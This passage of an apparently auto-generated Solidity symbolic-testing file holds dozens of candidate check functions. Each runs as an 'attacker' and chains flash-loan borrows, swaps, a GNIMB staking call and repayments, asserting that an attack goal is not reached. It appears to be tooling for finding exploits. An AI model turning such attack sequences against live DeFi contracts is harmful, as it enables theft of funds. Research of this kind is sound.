        vm.stopPrank();
    }

    function check_cand3468(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3469(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3470(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3471(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3472(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3473(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3474(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3475(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3476(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3477(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3478(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3479(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3480(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3481(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3482(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3483(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3484(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3485(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3486(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3487(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3488(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3489(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3490(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3491(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3492(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3493(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3494(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3495(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3496(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3497(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3498(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3499(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3500(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3501(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3502(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3503(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3504(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3505(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3506(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3507(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3508(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3509(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3510(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_owner_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3511(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3512(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3513(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3514(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
